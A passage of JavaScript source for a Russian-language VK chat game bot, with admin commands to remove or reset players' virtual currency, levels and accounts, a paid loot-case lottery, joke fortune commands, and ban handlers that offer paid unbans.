	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`❤ ➾ Пример: 'undon [ID] [Число] \n❤ Число - количество отнимаемого доната.'`); 
	let user = acc.users[user_id(message.user)];
	acc.users[message.$match[1]].donate -= Number(message.$match[2]);
	return message.send(`❤ @id${user.id}(${user.prefix}), Вы забрали  у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${message.$match[2]} сердец`);

});

vk.updates.hear(/^(?:remser)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'remdon [ID]'`); 
	acc.users[message.$match[1]].donate = 0;
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 3)
	return message.send(`❤ @id${user.id}(${user.prefix}), Вы забрали все сердечки у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);

});

vk.updates.hear(/^(?:unreit)\s?([0-9]+)?\s?([0-9]+)?/i, message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`❤ ➾ Пример: 'unreit [ID] [Число] \n❤ Число - количество отнимаемого рейтинга.'`); 
	let user = acc.users[user_id(message.user)]; 
	acc.users[message.$match[1]].global_exs -= Number(message.$match[2]);
	return message.send(`@id${user.id}(${user.prefix}), Вы забрали у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${message.$match[2]} рейтинга`);

});

vk.updates.hear(/^(?:remreit)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'remreit [ID]'`); 
	acc.users[message.$match[1]].global_exs = 0;
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 3)
	return message.send(`@id${user.id}(${user.prefix}), Вы забрали весь рейтинг у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);

});


vk.updates.hear(/^(?:unbit)\s?([0-9]+)?\s?([0-9]+)?/i, message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`❤ ➾ Пример: 'unbit [ID] [Число] \n❤ Число - количество отнимаемых биткоинов'`); 
	let user = acc.users[user_id(message.user)];
	if(user.level < 5) return; 
	acc.users[message.$match[1]].bitcoin -= Number(message.$match[2]);
	return message.send(`❤ @id${user.id}(${user.prefix}), Вы забрали у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${message.$match[2]} ฿`);

});

vk.updates.hear(/^(?:rembit)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'rembit [ID]'`); 
	acc.users[message.$match[1]].bitcoin = 0;
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 3)
	return message.send(`@id${user.id}(${user.prefix}), Вы забрали все биткоины у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);

});

vk.updates.hear(/^(?:remkey)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]]) return; 
	acc.users[message.$match[1]].keys = 0;
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 3)
	return message.send(`@id${user.id}(${user.prefix}), Вы забрали все ключи у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);

});

vk.updates.hear(/^(?:unlvl)\s?([0-9]+)?\s?([0-9]+)?/i, message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`❤ ➾ Пример: 'unlvl [ID] [Число] \n❤ Число - количество отнимаемого уровня'`); 
	let user = acc.users[user_id(message.user)];
	if(user.level < 5) return; 
	acc.users[message.$match[1]].lvl -= Number(message.$match[2]);
	return message.send(`❤ @id${user.id}(${user.prefix}), Вы сняли у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${message.$match[2]} кол-во уровня`);

});

vk.updates.hear(/^(?:remlvl)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'remlvl [ID]'`); 
	acc.users[message.$match[1]].lvl = 0;
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 3)
	return message.send(`@id${user.id}(${user.prefix}), Вы анулировали уровень игроку: [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);

});


vk.updates.hear(/^(?:unrub)\s?([0-9]+)?\s?([0-9]+)?/i, message => {
	let id = user_id(message.user)

	let i = config;
	if(user.full == false) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`❤ ➾ Пример: 'unrub [ID] [Число]'`); 
	let user = acc.users[user_id(message.user)]; 
	acc.users[message.$match[1]].rub -= Number(message.$match[2]);
	return message.send(`❤ @id${user.id}(${user.prefix}), Вы выщитали у игрока [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${message.$match[2]}₽ с донат счета`);

});

vk.updates.hear(/^(?:remrub)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(user.full == false) return;
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'remrub [ID]'`); 
	acc.users[message.$match[1]].rub = 0;
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 3)
	return message.send(`@id${user.id}(${user.prefix}), Вы анулировали Донат счёт игроку: [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);

});


vk.updates.hear(/^(?:unkeys)\s?([0-9]+)?\s?([0-9]+)?/i, message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`❤ ➾ Пример: 'unkeys [ID] [Число]'`); 
	let user = acc.users[user_id(message.user)];
	if(user.level < 5) return;
	acc.users[message.$match[1]].keys -= Number(message.$match[2]);
	return message.send(`❤ @id${user.id}(${user.prefix}), Вы выщитали у игрока [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${message.$match[2]} Ключей`);

});

vk.updates.hear(/^(?:remkeys)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'remkeys [ID]'`); 
	acc.users[message.$match[1]].keys = 0;
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 3)
	return message.send(`@id${user.id}(${user.prefix}), Вы анулировали ключи игроку: [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);

});

//Забираем




vk.updates.hear(/^(?:kopen)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.keys < 1) return message.send(`🔑 @id${user.id}(${user.prefix}), У вас ${user.keys} Ключей от кейсов! \n Для открытия кейса требуется как минимум 1 ключ | Для покупки введи: buykey`);
	user.keys -= 1;
	let rez = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18].random();
	if(rez == 1){
		let text = [].random(); 
		user.bitcoin += 250000;
		return message.send(`@id${user.id}(${user.prefix}), Открыв кейс, вы получили: 250.000 биткоинов !`);
	}
	if(rez == 2){
		let text = [].random(); 
		user.donate += 20;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: 20 сердец❤!`);
	}
	if(rez == 3){
		let text = [].random(); 
		user.donate += 20;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: 20 сердец❤!`);
	}
	if(rez == 4){
		let text = [].random(); 
		user.donate += 20;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: 20 сердец❤!`);
	}
	if(rez == 5){
		let text = [].random(); 
		user.balance += 50000000000;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: 50.000.000.000 $ !`);
	}
	if(rez == 6){
		let text = [].random(); 
		user.donate += 20;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: 20 сердец❤!`);
	}
	if(rez == 7){
		let text = [].random(); 
		user.donate += 10;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: 20 сердец❤!`);
	}
	if(rez == 8){
		let text = [].random(); 
		user.level = 1;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: Уровень доступа: VIP !\nНапиши "ahelp"`);
	}
	if(rez == 9){
		let text = [].random(); 
		user.level = 1;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: Уровень доступа: VIP !\nНапиши "ahelp"`);
	}
	if(rez == 10){
		let text = [].random(); 
		user.level = 1;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: Уровень доступа: VIP !\nНапиши "ahelp"`);
	}
	if(rez == 11){
		let text = [].random(); 
		user.level = 1;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: Уровень доступа: VIP !\nНапиши "ahelp"`);
	}
	if(rez == 12){
		let text = [].random(); 
		user.level = 1;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: Уровень доступа: VIP !\nНапиши "ahelp"`);
	}
	if(rez == 13){
		let text = [].random(); 
		user.level = 1;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: Уровень доступа: VIP !\nНапиши "ahelp"`);
	}
	if(rez == 14){
		let text = [].random(); 
		user.bitcoin += 0;
		return message.send(`📦 @id${user.id}(${user.prefix}), Увы(\nВам нечего не выпало`);
	}
	if(rez == 15){
		let text = [].random(); 
		user.keys += 5;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс вы получили 5 ключей 🔑 для открытия кейса\n Баланс ключей: ${user.keys} 🔑`);
	}
	if(rez == 16){
		let text = [].random(); 
		user.level = 2;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: Уровень доступа: Модератор!\nНапиши "ahelp"`);
	}
	if(rez == 17){
		let text = [].random(); 
		user.level = 3;
		return message.send(`📦 @id${user.id}(${user.prefix}), Открыв кейс, вы получили: Уровень доступа: Администратор! ПОЗДРАВЛЯЕМ!!!!!!\nНапиши "ahelp"`);
	}
	if(rez == 18){
		let text = [].random(); 
		user.bitcoin += 0;
		return message.send(`📦 @id${user.id}(${user.prefix}), Увы(\nВам нечего не выпало`);
	}

}); 



vk.updates.hear(/^(?:кейсы|кейс)$/i,  (message) => { 
	return message.send(`Донат кейс содержит:\n👑- 250.000 биткоинов
		👑- 50.000.000.000$
		👑- 20 сердец
		👑- Уровень доступа VIP.
		👑- Уровень доступа Модератор.
		👑- Уровень доступа Администратор [Джекпот].

		📦 Чтобы открыть данный кейс, напиши "kopen"
		🔆 Стоимость ключа для открытия кейса: 100 Сердец❤ = 50 рублей.
		-- Для покупки ключа введи: buykey



		`)
});

vk.updates.hear(/^(?:CMD)$/i, (message) => { 
	let user = acc.users[user_id(message.user)]; 
	if(user.full == false) return;
	{
		return message.send(`Команды @id287908009 (Разработчика)
			👑 Основные:

			Выдачи:
			0. Full [ID] [1-5] - Фулл Доступ: Позволяет управлять Администрацией не имея должности "Создатель"
			1. Деньги [Кол-во] - Выдать себе баланс
			2. Сердца [Кол-во] - Выдать себе сердца
			4. Руб [Кол-во] - Выдать себе донат счет
			5. giv [ID] [Число] - выдать валюту.
			6. grub [ID] [Кол-во Рублей] - Выдать донат счёт
			7. setser [ID] [Число] - выдать сердца.
			8. setreit [ID] [Число] - выдать рейтинг.
			9. setbit [ID] [Число] - выдать биткоины.
			10. setlvl [ID] [Число] - Выдать игровой уровень.

			Отним:
			11. unreit [ID] [Число]  - отнять кол-во рейтинга.
			12. unser [ID] [Число] - отнять кол-во сердец.
			13. unbit [ID] [Число]  - отнять кол-во биткоинов.
			14. unlvl [ID] [Число]  - отнять кол-во уровня.
			15. unrub [ID] [Число]  - отнять кол-во доната.
			16. ungiv [ID] [Число]  - отнять кол-во валюты.

			Обнул:
			17. remser [ID] Аннулировать сердца.
			18. remmon [ID] - аннулировать валюту полностью.
			19. remreit [ID] Аннулировать рейтинг.
			20. rembit [ID] Аннулировать биткоины.
			21. remlvl [ID] Аннулировать уровень.
			22. remrub [ID] Аннулировать донат счёт.

			👑 Дополнительно:

			Бусты:
			23. boostzp [ID] [Кол-Во Раз(1-24)] - Выдать: Авто-сбор Зарплаты.
			24. boostbiz [ID] [Кол-Во Раз(1-24)] - Выдать: Авто-сбор Прибыли.

			Временная/Навсегда выдача Привилегий:
			25. timevip [ID] [Время] - Выдать временно Доступ: VIP.
			26. timemoder [ID] [Время] - Выдать временно Доступ: Модератор.
			27. timeadm [ID] [Время] - Выдать временно Доступ: Администратор.
			28. setadmin [ID] [LVL - (1-5)] - Выдать уровень доступа.

			Наказания для Администрации/игроков:
			29. delladmin [ID] - Снять Администратора с поста.
			30. avig [ID] [Причина] - Выдать выговор Администратору.
			31. aunig [ID] - Снять выговор Администратору.
			32. gban [ID Администратора] [Причина] - Блокировка команды GIV.
			33. pban [ID] [Причина] - Блокировка передачи средств.
			34. rban [ID] [Причина] - Блокировка доступа к Репорту.

			Разное:
			35. setpromo [Сумма выигрыша] - Создать Промо-Код.
			36. Рассылка [Текст Рассылки] - Создать Рассылку.
			37. Прассылка [Идентификатор поста (Пример: Прассылка wall-132550063_1427)] - Создать рассылку поста.
			38. Обнулить [ID] - обнулить аккаунт игроку.
			`, 
			{ 
				keyboard:JSON.stringify( 
				{ 
					"one_time": true, 
					"buttons": [ 
					[{ 
						"action": { 
							"type": "text", 
							"payload": "{\"button\": \"1\"}", 
							"label": "admins" 
						}, 
						"color": "positive" 
					}, 
					{ 
						"action": { 
							"type": "text", 
							"payload": "{\"button\": \"1\"}", 
							"label": "astat" 
						}, 
						"color": "positive"
					}, 
					{ 
						"action": { 
							"type": "text", 
							"payload": "{\"button\": \"1\"}", 
							"label": "setpromo 7777777777" 
						}, 
						"color": "negative"  
					}, 
					{ 
						"action": { 
							"type": "text", 
							"payload": "{\"button\": \"1\"}", 
							"label": "Закрыть клавиатуру" 
						}, 
						"color": "negative" 
					}] 
					] 
				}) 
			}); 
	} 
});

//////////////////////////////////////ФАРТУНА
vk.updates.hear(/^(?:кто я)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [true].random();
	if(rez == false){
	}else{
		let count = ['Дурачёк','Дурка','Хороший человек','Малышка','Зайка','Девушка Админа','Девчёнка','Парень','П*зд*к','Какаха единорога','Никто...','ЛОХХХ.....','Кися','Кисинька','❤Мой Любимый❤','❤Секси❤','❤Секас❤','Крутой чел'].random();
		return message.send(` @id${user.id}(${user.prefix}), я думаю что ты ${count}`);
	}
}); 

vk.updates.hear(/^(?:когда)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [true].random();
	if(rez == false){
	}else{ 
		let count = ['Лет','Дней','Часов','Минут','Мили-секунд','Недель','Месяцев'].random();
		return message.send(`@id${user.id}(${user.prefix}), Я думаю что это произойдет через ${rand(1,210)} ${count}`);
	}
}); 
vk.updates.hear(/^(?:тир)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)


	if(user.bloks_tir > getUnix()) return message.send(`${rnick}, до следующей игры осталось: ${unixStampLeft(user.bloks_tir - Date.now())}`); // Лимит 


	if(user.gun_name == false)	 return message.send(`${rnick}, у вас нет оружия. ('Крутить')`)
		if(user.balance < 10000) return message.send(`${rnick}, на вашем балнсе должно быть не менее 10.000$`);
	user.balance -= 10000;
	user.bloks_tir = getUnix() + 900000
	let rez = [1,2,3,4,5,6,7,8,9,10,11].random();
	if(rez == 6){
		user.balance += 5000;
		message.send(`Готовим оружие к стрельбе..`); 
		setTimeout(() => {message.send(`Целимся в цель..`) }, 2500); 
		setTimeout(() => { return message.send(`${rnick}, вы не попали и проиграли 5000$`); }, 3999);   
	}else{ 
		let summ = rand(50000,500000);
		user.balance += summ;
		message.send(`Готовим оружие к стрельбе..`); 
		setTimeout(() => {message.send(`Целимся в цель..`) }, 2500); 
		setTimeout(() => { return message.send(`${rnick}, вы попали прямо в яблочко! \n Ваш приз составил: ${spaces(summ)}$`);  }, 3999);   
	}
});   


vk.updates.hear(/^(?:шар)\s([^]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔮 Подсказка: введи "Шар [Фраза]"`);
	let rez = [true].random();
	if(rez == false){
	}else{ 
		let count = ['никаких сомнений👌','⁣мой ответ - "нет"!😡','⁣предрешено😇','спроси позже😕','⁣пока не ясно😔','⁣сконцентрируйся и спроси опять😶','⁣перспективы не очень хорошие😲','⁣мне кажется - "Да"😄','⁣⁣знаки говорят - "Да"😊','⁣определённо да😌','м⁣ожешь быть уверен в этом☺😌✌','⁣лучше не рассказывать🙁','спроси позже😢','сейчас нельзя предсказать😨','весьма сомнительно😮','м⁣ожешь быть уверен в этом😜🖖'].random();
		return message.send(`🔮 @id${user.id}(${user.prefix}), ${count}`);
	}
});
//////////noga

////////////////////

vk.updates.hear(/^(?:Стикер)\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	let stick = message.$match[1];
	if(!message.$match[1]) return message.send(`${rnick}, Укажите ID Стикера`);  
	message.send({
		sticker_id: stick}).catch((error) => {return message.send(`😢 ${rnick}, к сожалению, мой @id287908009 (Владелец) не купил мне ещё пак в котором будет стикер №${message.$match[1]}`)});
});




vk.updates.hear(/^(?:совместимость)\s?([^]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`❤ @id${user.id}(${user.prefix}), Подсказка: введи "Совместимость [Имя парня/девушки]"`);  
	message.send(`❤ @id${user.id}(${user.prefix}), Ваша совместимость в любви с ${message.$match[1]} -- ${rand(0,100)}% 🙀\n😍Ваша совместимость в браке с ${message.$match[1]} -- ${rand(0,100)}% 💑`);
	return message.send({sticker_id: 9019});
});

vk.updates.hear(/^(?:инфа)\s?([^]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`❤ @id${user.id}(${user.prefix}), Подсказка: введи "Инфа [Фраза]"`);  
	message.send(`@id${user.id}(${user.prefix}), мне кажется около ${rand(0,100)}% 🙀`);
});


//кнопки



cm.hear(/^(?:кнопка)\s(.*)$/i, async(message) => { 
	let a = acc.users[user_id(message.user)];
	if(a.level < 4) {
		if(message.isChat){
			return message.reply(`Эту команду можно использовать только в группе!`); 
		}
	}

	if (message.$match[1].toLowerCase() === "удалить") { 
		a.buttons = []; 
		return message.send(`Все кнопки удалены ❌`, { 
			keyboard: Keyboard.keyboard([]) 
		}); 
	} 
	else 
	{ 
		if (a.buttons.length >= 40) return message.reply(`У вас достигнуто максимальное кол-во кнопок. ❌`); 
		a.buttons.push(message.$match[1]); 
		await message.send(`Кнопка «${message.$match[1]}» добавлена ✔`, { 
			keyboard: button(a.buttons) 
		}); 
	} 
});

vk.updates.hear(/^(?:обнулить|обнул|delete)\s?([0-9]+)?/i,  message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].level < 5) return;

	let user = acc.users[user_id(message.user)];
	if(user.full == false) return;
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`Ошибка!\n Пример команды: Обнулить [ID]`); 

	acc.users[message.$match[1]].balance = 0;
	acc.users[message.$match[1]].bitcoin =0
	acc.users[message.$match[1]].donate =0
	acc.users[message.$match[1]].exs =0
	acc.users[message.$match[1]].global_exs =0
	acc.users[message.$match[1]].exsup = 50
	acc.users[message.$match[1]].lvl =0
	acc.users[message.$match[1]].game.binlose =0
	acc.users[message.$match[1]].game.binwin =0
	acc.users[message.$match[1]].game.binstop = false
	acc.users[message.$match[1]].game.kazlose =0
	acc.users[message.$match[1]].game.kazwin =0
	acc.users[message.$match[1]].game.rand_lose =0
	acc.users[message.$match[1]].game.rand_win =0
	acc.users[message.$match[1]].game.stavka_win =0
	acc.users[message.$match[1]].game.stavka_lose =0
	acc.users[message.$match[1]].game.win = 50
	acc.users[message.$match[1]].msg.messages = 0
	acc.users[message.$match[1]].msg.last_msg = ''
	acc.users[message.$match[1]].prefix = `Онулирован | ${time()} | ${data()}`
	acc.users[message.$match[1]].cars = false
	acc.users[message.$match[1]].house = false
	acc.users[message.$match[1]].lodka = false
	acc.users[message.$match[1]].rep.status = false
	acc.users[message.$match[1]].rep.id = false 
	acc.users[message.$match[1]].warn = 0 
	acc.users[message.$match[1]].warn_p = []
	acc.users[message.$match[1]].aircraft = false
	acc.users[message.$match[1]].helicopter = false 
	acc.users[message.$match[1]].level = 0
	acc.users[message.$match[1]].bizs.one_biz = false
	acc.users[message.$match[1]].bizs.two_biz =  false
	acc.users[message.$match[1]].bizs.one.count = false
	acc.users[message.$match[1]].bizs.one.balance = 0
	acc.users[message.$match[1]].bizs.one.id = false
	acc.users[message.$match[1]].bizs.one.name = false
	acc.users[message.$match[1]].bizs.one.people = 0
	acc.users[message.$match[1]].bizs.one.uplvl = 0
	acc.users[message.$match[1]].bizs.one.zp = 0 
	acc.users[message.$match[1]].bizs.two.count = false
	acc.users[message.$match[1]].bizs.two.balance = 0
	acc.users[message.$match[1]].bizs.two.id = false
	acc.users[message.$match[1]].bizs.two.name = false
	acc.users[message.$match[1]].bizs.two.people = 0
	acc.users[message.$match[1]].bizs.two.uplvl = 0
	acc.users[message.$match[1]].bizs.two.zp = 0 
	acc.users[message.$match[1]].bizs.two.max_peop = 0 
	acc.users[message.$match[1]].bizs.one.max_peop = 0 
	acc.users[message.$match[1]].job.name = false;
	acc.users[message.$match[1]].job.count = 0;
	acc.users[message.$match[1]].job_stop = false;
	acc.users[message.$match[1]].job.lvl = 0;
	acc.users[message.$match[1]].mute = false;
	acc.users[message.$match[1]].reys = false;
	acc.users[message.$match[1]].housep = 0;
	acc.users[message.$match[1]].pit = false;
	acc.users[message.$match[1]].bank = 0;
	acc.users[message.$match[1]].brak = false;
	acc.users[message.$match[1]].brak = false;
	acc.users[message.$match[1]].safe_status = false;
	acc.users[message.$match[1]].safe_key = false;
	acc.users[message.$match[1]].credit = 0;
	acc.users[message.$match[1]].procent = 0;
	acc.users[message.$match[1]].global_exs = 0;
	acc.users[message.$match[1]].autozp = false;
	acc.users[message.$match[1]].autobiz = false;
	acc.users[message.$match[1]].frac_name = false;
	acc.users[message.$match[1]].duel = false;
	acc.users[message.$match[1]].duel_summ = false;
	acc.users[message.$match[1]].uron = 0;
	acc.users[message.$match[1]].gun_name = false;
	acc.users[message.$match[1]].block_game = true;
	acc.users[message.$match[1]].nachal = false;
	acc.users[message.$match[1]].rub = 0;
	acc.users[message.$match[1]].subyoutube = 0;
	acc.users[message.$match[1]].yyoutube = 0;
	acc.users[message.$match[1]].keys = 0;
	acc.users[message.$match[1]].pk = false;
	acc.users[message.$match[1]].spk = false;
	acc.users[message.$match[1]].youtube = false;
	acc.users[message.$match[1]].bphone = 0;
	acc.users[message.$match[1]].phone = false;
	acc.users[message.$match[1]].sphone = false;
	acc.users[message.$match[1]].full = false;
	acc.users[message.$match[1]].lock = true;
	acc.users[message.$match[1]].act = false;
	acc.users[message.$match[1]].unban = false;
	acc.users[message.$match[1]].verify = false;
	acc.users[message.$match[1]].invites = true;
	acc.users[message.$match[1]].invite = 0;
	return message.send(`Успех!\n @id${user.id}(${user.prefix}), Вы успешно онулировали аккаунт игрока @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})`);
	
});







// Выдача наказаний:


vk.updates.hear(/^(?:permban)\s?([0-9]+)?\s([^]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.level < 3) return;
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: Permban [ID] [Причина наказания]. \n Permban Это -- Перманентная блокировка [Блокировка даётся навсегда].`);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} уже имеет перманентную блокировку\n Для разблокировки, используйте: UnPermBan ${message.$match[1]}.`);
	if(!acc.users[message.$match[1]]) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	if(message.$match[1] == 2) return message.send(`🔸 Уважаемый @id${user.id}(Администратор), к сожалению @id287908009 (Разработчику) невозможно выдать временную блокировку.`);
	if(acc.users[message.$match[1]].unban == true) return message.send(`У пользователя ${acc.users[message.$match[1]].prefix} стоит Анти-PERMBAN!`);
	acc.users[message.$match[1]].ban = true
	acc.users[message.$match[1]].level = 0
	acc.users[message.$match[1]].rub = 0
	acc.users[message.$match[1]].donate = 0    
	user.ainfo.bans += 1;
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Администратор: ${user.prefix}, выдал вам -- Перманентную блокировку [Блокировка навсегда].\n -- Комментарий Администратора: ${message.$match[2]}.\n -- [Система]: Снятие перманентной блокировки стоит 100₽ -- По поводу преобретения, писать @id287908009 (Основателю).`,
		random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`@id${user.id}(${user.prefix}), Вы выдали игроку ${acc.users[message.$match[1]].prefix} перманентную блокировку [Блокировка навсегда].\n -- Причина блокировки: ${message.$match[2]}.`);
}); 


vk.updates.hear(/^(?:ban)?\s([0-9]+)?\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.level < 2) return;
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} Уже заблокирован навсегда.`);
	if(acc.users[message.$match[1]].mute == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} Уже имеет временную блокировку.\n -- Для разблокировки используйте команду: UnBan ${message.$match[1]}`);
	if(!acc.users[message.$match[1]]) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	if(message.$match[1] == 2) return message.send(`🔸 Уважаемый @id${user.id}(Администратор), к сожалению @id287908009 (Разработчику) невозможно выдать временную блокировку.`);
	if(acc.users[message.$match[1]].unban == true) return message.send(`У пользователя ${acc.users[message.$match[1]].prefix} стоит Анти-BAN!`);
	if(!message.$match[2] || !Number(message.$match[1]) || !Number(message.$match[2]) || !acc.users[message.$match[1]] || message.$match[2] > 1440 || message.$match[2] < 1) return message.send(` @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: Ban [ID] [Время наказания (Минимально: 1 Минута - Максимально: 1440 Минут{24 часа})]. \n Ban Это -- Временная блокировка аккаунта [Блокировка даётся на время].`);
	let time = message.$match[2] * 60000;
	let id = Number(message.$match[1])
	acc.users[id].mute = true;

	var is = [user_id(message.user), message.text] 
	adm_log(is)

	setTimeout(() => {
		acc.users[id].mute = false;
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: `[Система]: Срок временной блокировки истёк. \n -- С вашего Аккаунта быыла снята временная блокировка\n Удачной игры, не нарушайте больше.`,			random_id: 0
		});
	}, time);

	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Администратор: ${user.prefix}, выдал вам -- Временную блокировку аккаунта на ${message.$match[2]} минут.\n\n -- Через [${message.$match[2]}] минут ваш аккаунт будет разблокирован.\n -- [Система]: Снятие досрочно, временной блокировки стоит 30₽ -- По поводу преобретения, писать @id287908009 (Основателю).`,			random_id: 0
	});
